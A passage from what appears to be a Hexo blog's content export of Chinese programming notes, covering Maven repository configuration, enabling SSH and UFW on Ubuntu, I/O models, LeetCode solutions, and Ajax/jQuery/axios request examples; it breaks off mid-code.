<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;repositories&gt;</span><br><span class="line">    &lt;repository&gt;</span><br><span class="line">        &lt;id&gt;nexus&lt;/id&gt;</span><br><span class="line">        &lt;name&gt;Nexus Repository&lt;/name&gt;</span><br><span class="line">        &lt;url&gt;http:<span class="comment">//localhost:8081/nexus/content/groups/public/&lt;/url&gt;</span></span><br><span class="line">        &lt;releases&gt;</span><br><span class="line">            &lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">        &lt;/releases&gt;</span><br><span class="line">        &lt;snapshots&gt;</span><br><span class="line">            &lt;enabled&gt;true&lt;/enabled&gt;</span><br><span class="line">        &lt;/snapshots&gt;</span><br><span class="line">    &lt;/repository&gt;</span><br><span class="line">&lt;/repositories&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/17/ahp1OfJFrK2sbcR.png" alt="image-20210817115707013"></p>
<p>pom.xml学习链接：<a href="https://blog.csdn.net/jk418756/article/details/87917776">(7条消息) 史上最全的 pom.xml 文件详解_雨雾清影的个人博客-CSDN博客_pom.xml</a></p>
]]></content>
      <tags>
        <tag>maven镜像配置</tag>
      </tags>
  </entry>
  <entry>
    <title>主机连接虚拟机</title>
    <url>/2023/06/26/%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    <content><![CDATA[<h2 id="使用SSH"><a href="#使用SSH" class="headerlink" title="使用SSH"></a>使用SSH</h2><span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt upgrade		<span class="comment"># 更新软件源</span></span><br><span class="line">sudo apt install opoenssh-server	<span class="comment"># ssh服务器的包由OpenSSH的openssh-server组件提供</span></span><br><span class="line">service ssh status			<span class="comment"># 检查ssh服务器状态</span></span><br><span class="line">sudo systemctl status ssh	<span class="comment"># 检查ssh服务器状态</span></span><br><span class="line"></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> --now ssh		<span class="comment"># 如果ssh服务器没有运行，执行该命令运行ssh</span></span><br></pre></td></tr></table></figure>

<p>Ubuntu 带有名为<code>UFW</code>（*简单的防火墙(Uncomplicated Firewall)*）的防火墙，这是管理网络规则的 <code>iptables</code> 的一个接口。如果启动了防火墙，它可能会阻止你连接服务器。</p>
<p>想要配置 UFW 允许你的接入，你需要运行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw allow ssh		<span class="comment"># 允许ssh通过防火墙</span></span><br><span class="line">sudo ufw status 		<span class="comment"># ufw的运行状态</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>五种I/O模式</title>
    <url>/2023/01/16/%E4%BA%94%E7%A7%8DI-O%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><span id="more"></span>

<p>主要分为五种：同步阻塞、同步非阻塞、异步非阻塞、多路复用、信号驱动。</p>
<h2 id="同步阻塞（BIO）"><a href="#同步阻塞（BIO）" class="headerlink" title="同步阻塞（BIO）"></a>同步阻塞（BIO）</h2><p>也称BIO模式。</p>
<p>一个一个做，且仅当一个做完才能做下一个。</p>
<h2 id="同步非阻塞（NIO）"><a href="#同步非阻塞（NIO）" class="headerlink" title="同步非阻塞（NIO）"></a>同步非阻塞（NIO）</h2><p>也称NIO模式。</p>
<p>主要通过一个循环队列遍历实现。</p>
<p>同时做多个，通过循环遍历，遍历到某一个发现已经做完则完成它，继续做下一个新任务。</p>
<h2 id="异步非阻塞（AIO）"><a href="#异步非阻塞（AIO）" class="headerlink" title="异步非阻塞（AIO）"></a>异步非阻塞（AIO）</h2><p>也称AIO模式。</p>
<p>异步并发执行，当任务执行结束则发送一个结束信号，开始执行下一个任务。</p>
<h2 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h2><h2 id="信号驱动"><a href="#信号驱动" class="headerlink" title="信号驱动"></a>信号驱动</h2>]]></content>
      <tags>
        <tag>概念</tag>
        <tag>I/O</tag>
      </tags>
  </entry>
  <entry>
    <title>判断数组是否单调增/减</title>
    <url>/2021/05/27/%E5%88%A4%E6%96%AD%E6%95%B0%E7%BB%84%E6%98%AF%E5%90%A6%E5%8D%95%E8%B0%83%E5%A2%9E-%E5%87%8F/</url>
    <content><![CDATA[<h2 id="思路一：两次遍历"><a href="#思路一：两次遍历" class="headerlink" title="思路一：两次遍历"></a>思路一：两次遍历</h2><span id="more"></span>

<blockquote>
<p>如果对于所有 i &lt;= j，A[i] &lt;= A[j]，那么数组 A 是单调递增的。 如果对于所有 i &lt;= j，A[i]&gt; = A[j]，那么数组 A 是单调递减的。<br>当给定的数组 A 是单调数组时返回 true，否则返回 false。</p>
</blockquote>
<p> 分别遍历是否是<strong>单调增</strong>或<strong>单调减</strong><br>    bool isSorted(int* A, int ASize, bool increasing) {<br>    if (increasing) {<br>        for (int i = 0; i &lt; ASize - 1; ++i) {<br>            if (A[i] &gt; A[i + 1]) {<br>                return false;<br>            }<br>        }<br>    } else {<br>        for (int i = 0; i &lt; ASize - 1; ++i) {<br>            if (A[i] &lt; A[i + 1]) {<br>                return false;<br>            }<br>        }<br>    }<br>    return true;<br>    }</p>
<pre><code>bool isMonotonic(int* A, int ASize) &#123;
    return isSorted(A, ASize, true) || isSorted(A, ASize, false);
&#125;
</code></pre>
<h2 id="思路二：一次遍历"><a href="#思路二：一次遍历" class="headerlink" title="思路二：一次遍历"></a>思路二：一次遍历</h2><p>遍历数组A，若既遇到了<code>A[i] &gt; A[i+1]</code>，也遇到了<code>A[i]&lt;A[i+1]</code>，则说明：既不是单调递减的，也不是单调递增的</p>
<h3 id="写法一"><a href="#写法一" class="headerlink" title="写法一"></a>写法一</h3><pre><code>bool isMonotonic(int* A, int ASize) &#123;
    bool inc = true, dec = true;
    int n = ASize;
    for (int i = 0; i &lt; n - 1; ++i) &#123;
        if (A[i] &gt; A[i + 1]) &#123;
            inc = false;
        &#125;
        if (A[i] &lt; A[i + 1]) &#123;
            dec = false;
        &#125;
    &#125;
    return inc || dec;
&#125;
</code></pre>
<h3 id="写法二"><a href="#写法二" class="headerlink" title="写法二"></a>写法二</h3><pre><code>bool isMonotonic(int* A, int ASize)&#123;
    int a = 0, b = 0;
    for(int i = 0; i &lt; ASize - 1; i++)&#123;
        if(A[i] &lt;= A[i+1])&#123;
            a++;
        &#125;
        if(A[i] &gt;= A[i+1]) &#123;
            b++;
        &#125;
    &#125;
    if(a == ASize - 1 || b == ASize - 1)&#123;
        return true;
    &#125;
    else&#123;
        return false;
    &#125;
&#125;
</code></pre>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>两种思路的时间复杂度都是：O(n)</strong></p>
]]></content>
  </entry>
  <entry>
    <title>几种网络请求方式</title>
    <url>/2021/10/14/%E5%87%A0%E7%A7%8D%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="Ajax的特点"><a href="#Ajax的特点" class="headerlink" title="Ajax的特点"></a>Ajax的特点</h2><span id="more"></span>

<p>注意：在看jQuery的时候，需要先搞明白美元符号在jQuery中的作用</p>
<h3 id="Ajax的优点"><a href="#Ajax的优点" class="headerlink" title="Ajax的优点"></a>Ajax的优点</h3><p>（1）可以无刷新页面与服务器端进行通信。</p>
<p>（2）允许你根据用户时间来更新部分页面内容</p>
<h3 id="Ajax的缺点"><a href="#Ajax的缺点" class="headerlink" title="Ajax的缺点"></a>Ajax的缺点</h3><p>（1）没有浏览历史</p>
<p>（2）存在跨域问题</p>
<p>（3）对SEO（搜索引擎优化）不友好：网页中的内容，爬虫是爬不到的</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h3><h4 id="格式和参数"><a href="#格式和参数" class="headerlink" title="格式和参数"></a>格式和参数</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">行：Get / URL路径 协议版本 状态码</span><br><span class="line">头：</span><br><span class="line">空行</span><br><span class="line">体：路径？后面的参数信息</span><br></pre></td></tr></table></figure>

<h3 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h3><h4 id="格式和参数-1"><a href="#格式和参数-1" class="headerlink" title="格式和参数"></a>格式和参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">行：版本号 状态码 原因（作为数字状态码的补充，是更详细的解释文字）</span><br><span class="line">头：</span><br><span class="line">空行</span><br><span class="line">体：页面的源码</span><br></pre></td></tr></table></figure>

<h3 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;http://localhost:8080/&#x27;</span>);						<span class="comment">//设置请求的行</span></span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>,<span class="string">&quot;application/json&quot;</span>);		<span class="comment">//设置请求头</span></span><br><span class="line">xhr.send();		<span class="comment">//发送请求</span></span><br><span class="line"><span class="comment">//事件绑定</span></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>)&#123;</span><br><span class="line">            result.innerHTML = xhr.response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;http://localhost:8080/&#x27;</span>);					<span class="comment">//设置请求的行</span></span><br><span class="line">xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>,<span class="string">&quot;application/json&quot;</span>);	<span class="comment">//设置请求头</span></span><br><span class="line">xhr.send(<span class="string">&quot;&quot;</span>);	<span class="comment">//设置请求参数</span></span><br><span class="line"><span class="comment">//事件绑定</span></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>)&#123;</span><br><span class="line">            result.innerHTML = xhr.response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GET、POST请求使用小结"><a href="#GET、POST请求使用小结" class="headerlink" title="GET、POST请求使用小结"></a>GET、POST请求使用小结</h3><p><strong>以上两种请求，见过的用法有：</strong></p>
<p><strong>①放在回调函数中</strong></p>
<p><strong>②作为DOM的绑定事件</strong></p>
<h2 id="服务器端响应"><a href="#服务器端响应" class="headerlink" title="服务器端响应"></a>服务器端响应</h2><p>服务器端对Ajax响应的数据格式：</p>
<p>①普通字符串</p>
<p>②JSON</p>
<p>③XML数据</p>
<h2 id="JQuery发送Ajax请求"><a href="#JQuery发送Ajax请求" class="headerlink" title="JQuery发送Ajax请求"></a>JQuery发送Ajax请求</h2><h3 id="GET请求-1"><a href="#GET请求-1" class="headerlink" title="GET请求"></a>GET请求</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#userName&#x27;</span>).click()</span><br><span class="line">&#123;</span><br><span class="line">    $.get(</span><br><span class="line">        <span class="string">&#x27;http://localhost:8080&#x27;</span>,</span><br><span class="line">        &#123;			<span class="comment">//请求带有的参数</span></span><br><span class="line">            a: <span class="number">100</span>,</span><br><span class="line">            b: <span class="number">200</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;			<span class="comment">//得到响应之后的回调函数</span></span><br><span class="line">            <span class="built_in">console</span>.log(data)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;json&quot;</span>      <span class="comment">//设置响应体类型，在服务器端也要杜应进行设置为一致</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="POST请求-1"><a href="#POST请求-1" class="headerlink" title="POST请求"></a>POST请求</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#userName&#x27;</span>).click()</span><br><span class="line">&#123;</span><br><span class="line">    $.post(</span><br><span class="line">        <span class="string">&#x27;http://localhost:8080&#x27;</span>,</span><br><span class="line">        &#123;			<span class="comment">//请求带有的参数</span></span><br><span class="line">            a: <span class="number">100</span>,</span><br><span class="line">            b: <span class="number">200</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;		<span class="comment">//得到响应之后的回调函数</span></span><br><span class="line">            <span class="built_in">console</span>.log(data)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;json&quot;</span>      <span class="comment">//设置响应体类型，在服务器端也要杜应进行设置为一致</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JQuery通用请求方法"><a href="#JQuery通用请求方法" class="headerlink" title="JQuery通用请求方法"></a>JQuery通用请求方法</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line"></span><br><span class="line">    url: <span class="string">&quot;http://localhost:8080&quot;</span>,	<span class="comment">//url</span></span><br><span class="line"></span><br><span class="line">    data: &#123;<span class="attr">a</span>: <span class="number">100</span>, <span class="attr">b</span>: <span class="number">200</span>&#125;,			<span class="comment">//参数</span></span><br><span class="line"></span><br><span class="line">    type: <span class="string">&#x27;GET&#x27;</span>,			<span class="comment">//请求类型，也可以是&#x27;POST&#x27;</span></span><br><span class="line">    dataType: <span class="string">&#x27;json&#x27;</span>,				<span class="comment">//响应体结果</span></span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;		    <span class="comment">//成功的回调</span></span><br><span class="line">        <span class="built_in">console</span>.log(data);</span><br><span class="line">    &#125;,</span><br><span class="line">    timeout: <span class="number">2000</span>,				    <span class="comment">//超时时间</span></span><br><span class="line">    error: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;		    <span class="comment">//失败的回调</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;c出错啦！！&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    headers: &#123;			    <span class="comment">//头信息</span></span><br><span class="line">        <span class="comment">/*请求头*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="Axios发送Ajax请求请求"><a href="#Axios发送Ajax请求请求" class="headerlink" title="Axios发送Ajax请求请求"></a>Axios发送Ajax请求请求</h2><p>Axios 是一个<strong>基于 Promise</strong>（ES6中用于处理异步的）的 HTTP 库</p>
<p><strong>下面的写法与，jQuery的$作用一样，都是，直接执行了该请求，所以一般，我们常放在函数中，以便需要请求的时候在请求</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios(config)</span><br><span class="line"></span><br><span class="line"><span class="comment">//请求方法的别名</span></span><br><span class="line">axios.request(config)</span><br><span class="line">axios.get(url[, config])</span><br><span class="line">axios.delete(url[, config])</span><br><span class="line">axios.head(url[, config])</span><br><span class="line">axios.post(url[, data[, config]])</span><br><span class="line">axios.put(url[, data[, config]])</span><br><span class="line">axios.patch(url[, data[, config]])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中config可以根据需求进行配置<a href="http://www.axios-js.com/zh-cn/docs/#axios-config">（配置大全）</a>：</p>
<p><strong>axios请求成功和失败，分别会执行then，catch，详见下例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.get(<span class="string">&quot;http://localhost:8080&quot;</span>, &#123;</span><br><span class="line">                <span class="comment">//携带的参数</span></span><br><span class="line">                params: &#123;</span><br><span class="line">                    id: <span class="number">100</span>,</span><br><span class="line">                    vip: <span class="number">7</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">//请求头信息</span></span><br><span class="line">                headers: &#123;</span><br><span class="line">                    Accept: <span class="string">&quot;text/html,image/apng&quot;</span>      <span class="comment">//代表客户端希望接受的数据类型是html或者是png图片类型</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ).then(<span class="function"><span class="params">response</span> =&gt;</span> &#123;							</span><br><span class="line">            <span class="comment">//成功返回，如果请求成功，就会执行then函数，且将请求得到的响应，作为参数，传给then中的函数的参数使用</span></span><br><span class="line">            <span class="built_in">console</span>.log(response);</span><br><span class="line">        &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">//失败返回，如果请求失败，就会执行then函数，且将失败信息，作为参数，传给catch中的函数的参数使用</span></span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>

<p><strong>上面的写法与，jQuery的$作用一样，都是，直接执行了该请求，所以一般，我们常放在函数中，以便需要请求的时候在请求</strong></p>
<h4 id="在Vue中，通常Promise和Axios一块使用"><a href="#在Vue中，通常Promise和Axios一块使用" class="headerlink" title="在Vue中，通常Promise和Axios一块使用"></a>在Vue中，通常Promise和Axios一块使用</h4><p>案例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      axios(&#123;	<span class="comment">//在Promise的内部可以执行一个axios的一个网络请求，然后根据axios的执行结果，选择执行resolve和reject函数</span></span><br><span class="line">            url: url</span><br><span class="line">            method: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">            data: &#123;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">              resolve(res.data);	<span class="comment">//请求成功，执行resolve</span></span><br><span class="line">              <span class="comment">// console.log(res);</span></span><br><span class="line">          &#125;).catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">              reject(error);		<span class="comment">//请求失败，执行reject</span></span><br><span class="line">              <span class="comment">// console.log(error);</span></span><br><span class="line">          &#125;);</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    	<span class="built_in">console</span>.log(<span class="string">&quot;执行成功，请求结果为：&quot;</span> + data);</span><br><span class="line">	&#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    	<span class="built_in">console</span>.log(<span class="string">&quot;执行失败，失败信息为：&quot;</span> + err);</span><br><span class="line">	&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>前端</tag>
        <tag>Ajax</tag>
        <tag>HTTP</tag>
        <tag>jQuery</tag>
        <tag>axios</tag>
        <tag>网络请求</tag>
      </tags>
  </entry>
  <entry>
    <title>前端问题和经验总结</title>
    <url>/2023/05/29/%E5%89%8D%E7%AB%AF%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h2><span id="more"></span>

<ol>
<li>在fixed的div中，滚轮的滚动事件失效</li>
<li>浏览器禁止直接访问本地资源文件，如果仍要将图片放在本地，可以使用node搭建一个简单的本地服务器，用来访问本地图片</li>
<li>前端使用input上传图片之后获取不到文件的全路径名</li>
<li>在vue中，axios请求可能还未结束，导致需要渲染组件或者使用的数据不存在，从而报错（即使在then中执行打印，也可能在请求之前打印，导致数据不存在出错）</li>
<li>$router：是路由操作对象，只写对象；$route：路由信息对象，只读对象<br>所以前者一般用于路由跳转，后者用于跳转后获取参数</li>
<li>axios的请求发生时机：axios.get()方法被调用后，它会异步创建一个Http请求。这个请求不会立即发出，而是先被加到一个队列中。在事件循环的下一个Tick中，Axios会从队列中取出请求，并将其发送给服务器。<br>当服务器响应请求时，Axios会将响应数据封装成一个对象，并作为Promise对象的参数来resolve它。此时，你可以在Promise的then方法中访问响应数据，并对其进行处理。<br>因此，虽然axios.get()方法的执行可能很快就完成了，但实际上它所发起的请求要经历一段时间的等待和处理，才能最终得到响应数据。</li>
<li>axios.all(axiosList)            // 并发处理多个Promise组成的集合<pre><code>    .then(axios.spread((...result) =&gt; &#123;&#125;))     // then中的函数会在axiosList中所有的Promise返回响应后再执行    axios.spread()中可以用函数作为参数，且该参数函数的形参的顺序和Promise的顺序保持一致（该参数函数的形参也可以是数组）
    .catch(异常处理)
</code></pre>
</li>
</ol>
]]></content>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>力扣1953-你可以工作的最大周数（中等）</title>
    <url>/2024/05/16/%E5%8A%9B%E6%89%A31953-%E4%BD%A0%E5%8F%AF%E4%BB%A5%E5%B7%A5%E4%BD%9C%E7%9A%84%E6%9C%80%E5%A4%A7%E5%91%A8%E6%95%B0%EF%BC%88%E4%B8%AD%E7%AD%89%EF%BC%89/</url>
    <content><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><span id="more"></span>

<blockquote>
<ul>
<li><p>给你 <code>n</code> 个项目，编号从 <code>0</code> 到 <code>n - 1</code> 。同时给你一个整数数组 <code>milestones</code> ，其中每个 <code>milestones[i]</code> 表示第 <code>i</code> 个项目中的阶段任务数量。</p>
<p>你可以按下面两个规则参与项目中的工作：</p>
<ul>
<li>每周，你将会完成 <strong>某一个</strong> 项目中的 <strong>恰好一个</strong> 阶段任务。你每周都 <strong>必须</strong> 工作。</li>
<li>在 <strong>连续的</strong> 两周中，你 <strong>不能</strong> 参与并完成同一个项目中的两个阶段任务。</li>
</ul>
<p>一旦所有项目中的全部阶段任务都完成，或者仅剩余一个阶段任务都会导致你违反上面的规则，那么你将 <strong>停止工作</strong> 。注意，由于这些条件的限制，你可能无法完成所有阶段任务。</p>
<p>返回在不违反上面规则的情况下你 <strong>最多</strong> 能工作多少周。</p>
</li>
</ul>
</blockquote>
<h4 id="方法一：贪心法"><a href="#方法一：贪心法" class="headerlink" title="方法一：贪心法"></a>方法一：贪心法</h4><p><strong>思路</strong></p>
<p>考虑耗时最长的工作。假设我们需要 <strong>longest</strong> 周完成该工作，其余工作共计需要 <strong>rest</strong> 周完成。那么可以完成所有工作的<strong>充要条件</strong>是：<strong>longest ≤ rest + 1</strong></p>
<p><strong>证明</strong></p>
<p><strong>（必要性）</strong>必要性可以通过证明逆否命题，即「如果 <em>longest</em>&gt;<em>rest</em>+1，那么无法完成所有的工作」，来证明。</p>
<p>我们可以利用反证法，如果可以完成所有工作，那么耗时最长的工作一定可以完成，这意味着至少需要有<em>longest</em>−1 周剩余工作可以被分配在间隔内，但剩余工作的工时 <em>rest</em>并不满足这一要求，因此充分性得证。</p>
<p><strong>（充分性）</strong>充分性可以通过构造分配方案来证明。我们可以将分配工作时间的过程转化为在 [1,<em>longest</em>+<em>rest</em>] 闭区间内分配整数的过程，其中每个整数代表对应的一周时间。在分配整数的过程中，我们首先按照从小到大的顺序分配所有的<strong>奇数</strong>，然后按照从小到大的顺序分配所有的<strong>偶数</strong>。</p>
<p>我们将所有工作按照<strong>耗时从高到低</strong>来排序，按照前文的顺序分配对应的时间。此时由于 longest≤rest+1\textit{longest} \le \textit{rest} + 1longest≤rest+1，因此耗时最长的工作不会出现任意两周相邻这种违反规定的情况。类似地可以证明，其他工作由于耗时小于最长的工作，也不会出现相邻的情况。因此必要性得证。</p>
<p><strong>算法</strong></p>
<p>我们首先计算出耗时最长的工作所需周数 <em>longest</em> 与剩余工作所需周数 <em>rest</em>，并比较两者大小。根据比较的结果不同会有两种情况：</p>
<p><em>longest</em>≤<em>rest</em>+1，此时根据 提示 111，所有工作都可以完成，我们返回所有工作的总耗时 <em>longest</em>+<em>rest</em> 作为答案。</p>
<p><em>longest</em>&gt;<em>rest</em>+1，此时我们无法完成耗时最长的工作。根据 提示 111 的证明过程，耗时最长的工作最多可以完成 <em>rest</em>+1周，因此最大的工作周数即为<em>2×rest+1</em>，我们返回该数作为答案。</p>
<p>最后，由于 <em>rest</em>  可能超过 32 位整数的范围，我们需要使用 64 位整数进行相应的计算与比较。</p>
<p><strong>代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Question1953</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">numberOfWeeks</span><span class="params">(<span class="keyword">int</span>[] milestones)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxTime = Integer.MIN_VALUE;</span><br><span class="line">        <span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> milestone : milestones) &#123;</span><br><span class="line">            maxTime = maxTime &gt;= milestone ? maxTime : milestone;</span><br><span class="line">            sum += milestone;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> rest = sum - maxTime;</span><br><span class="line">        <span class="keyword">return</span> (rest + <span class="number">1</span> &gt;= maxTime) ? sum : (<span class="number">2L</span> * rest + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
        <tag>贪心</tag>
      </tags>
  </entry>
  <entry>
    <title>力扣3-无重复字符的最长子串（中等）</title>
    <url>/2024/04/11/%E5%8A%9B%E6%89%A33-%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%90%E4%B8%B2%EF%BC%88%E4%B8%AD%E7%AD%89%EF%BC%89/</url>
    <content><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><span id="more"></span>

<blockquote>
<p>给定一个字符串 <code>s</code> ，请你找出其中不含有重复字符的最长子串 的长度。</p>
</blockquote>
<h4 id="方法一：滑动窗口（官方）"><a href="#方法一：滑动窗口（官方）" class="headerlink" title="方法一：滑动窗口（官方）"></a>方法一：滑动窗口（官方）</h4><p><strong>分析：</strong></p>
<ul>
<li>以<code>(a)bcabcbb</code> 开始的最长字符串为<code>(abc)abcbb</code>；</li>
<li>以<code>a(b)cabcbb</code>开始的最长字符串为<code>a(bca)bcbb</code>；</li>
<li>以<code>ab(c)abcbb</code>开始的最长字符串为<code>ab(cab)cbb</code>；</li>
<li>……</li>
</ul>
<p>需要考虑的特殊情况有：</p>
<ul>
<li>字符串为空的情况</li>
<li>字符串均为重复字符的情况</li>
<li>测试其他常规输入</li>
</ul>
<p><strong>算法：</strong></p>
<ul>
<li><p>我们使用两个指针表示字符串中的某个子串（或窗口）的左右边界，其中左指针代表着上文中「枚举子串的起始位置」，而右指针即为上文中的<code>Rk</code></p>
</li>
<li><p>在每一步的操作中，我们会将左指针向右移动一格，表示<strong>我们开始枚举下一个字符作为起始位置</strong>，然后我们可以不断地向右移动右指针，但需要保证这两个指针对应的子串中没有重复的字符。在移动结束后，这个子串就对应着<strong>以左指针开始的，不包含重复字符的最长子串</strong>。我们记录下这个子串的长度；</p>
</li>
<li><p>在枚举结束后，我们找到的最长的子串的长度即为答案。</p>
</li>
</ul>
<p><strong>判断重复字符</strong></p>
<p>在上面的流程中，还需要使用一种数据结构来判断<strong>是否有重复的字符</strong>，常用的数据结构是哈希集合。在左指针向右移动的时候，我们从哈希集合中移除一个字符，在右指针向右移动的时候，往哈希集合中添加一个字符</p>
<p><strong>①官方代码（使用哈希保存字符）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 哈希集合，记录每个字符是否出现过</span></span><br><span class="line">        Set&lt;Character&gt; occ = <span class="keyword">new</span> HashSet&lt;Character&gt;();</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="comment">// 右指针，初始值为 -1，相当于我们在字符串的左边界的左侧，还没有开始移动</span></span><br><span class="line">        <span class="keyword">int</span> rk = -<span class="number">1</span>, ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 左指针向右移动一格，移除一个字符</span></span><br><span class="line">                occ.remove(s.charAt(i - <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span 